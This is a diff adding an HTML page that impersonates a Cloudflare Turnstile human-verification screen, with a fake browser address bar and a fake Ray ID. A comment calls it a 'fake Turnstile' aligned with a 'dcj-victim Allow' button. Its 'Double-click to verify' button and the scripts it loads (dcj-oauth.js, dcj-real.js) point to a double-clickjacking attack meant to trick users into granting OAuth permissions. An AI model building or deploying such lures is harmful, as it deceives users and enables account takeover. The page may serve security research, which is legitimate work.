@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>One moment…</title>
+  <link rel="stylesheet" href="dcj.css">
+</head>
+<body>
+
+  <div class="cf-bg" aria-hidden="true"></div>
+
+  <div class="browser-bar">
+    <div class="browser-dots">
+      <div class="dot dot-r"></div>
+      <div class="dot dot-y"></div>
+      <div class="dot dot-g"></div>
+    </div>
+    <div class="url-bar">
+      <span class="lock-icon">🔒</span>
+      <span class="url-text">
+        <span class="url-domain">challenges.cloudflare.com</span>/turnstile/v0/b/…
+      </span>
+    </div>
+  </div>
+
+  <div id="cf-stage" class="cf-stage">
+    <p id="cf-lead" class="cf-lead real-only">
+      <span class="cf-lead-tag">Security check</span>
+      Review the verification below to continue to the requested site.
+    </p>
+
+    <div class="card">
+      <div class="cf-logo">
+        <img src="https://cdn.simpleicons.org/cloudflare/F6821F" width="28" height="28" alt="">
+        <span class="cf-name">Cloudflare</span>
+      </div>
+      <h1>Verify you are human</h1>
+      <p class="desc">
+        This site is protected against automated access.<br>
+        Complete the verification to continue.
+      </p>
+
+      <ul id="cf-checks" class="cf-checks real-only">
+        <li><span class="cf-check-icon">✓</span> Browser integrity</li>
+        <li><span class="cf-check-icon">✓</span> TLS connection</li>
+        <li><span class="cf-check-icon cf-check-pending">◌</span> Human verification</li>
+      </ul>
+
+      <div class="btn-slot"></div>
+
+      <div class="checking-row">
+        <div class="spinner"></div>
+        Checking your browser before proceeding…
+      </div>
+    </div>
+
+    <div id="cf-meta" class="cf-meta real-only">
+      <div class="cf-meta-row">
+        <span>🔒 Encrypted connection</span>
+        <span>🛡 DDoS protection active</span>
+      </div>
+      <a href="#" class="cf-why" onclick="return false">Why am I seeing this?</a>
+    </div>
+  </div>
+
+  <!-- Default mode: fake Turnstile, fixed at 50/50 to align with dcj-victim Allow -->
+  <button id="verify-btn" type="button">
+    <div class="cb-box"></div>
+    <div class="btn-label">
+      <span class="btn-main">I am human</span>
+      <span class="btn-hint">Double-click to verify</span>
+    </div>
+    <div class="cf-badge">
+      <img src="https://cdn.simpleicons.org/cloudflare/F6821F" width="16" height="16" alt="">
+      <span class="cf-badge-text">Turnstile</span>
+    </div>
+  </button>
+
+  <div class="footnote">
+    <a href="#">Privacy</a> · <a href="#">Terms</a> · Cloudflare, Inc.
+  </div>
+
+  <div id="cf-ray" class="cf-ray real-only">
+    Ray ID: <code>8f3a2c1b9d4e7f06</code> · Performance &amp; security by Cloudflare
+  </div>
+
+  <script src="dcj-config.js"></script>
+  <script src="dcj-oauth.js"></script>
+  <script src="dcj-real.js"></script>
+</body>
+</html>
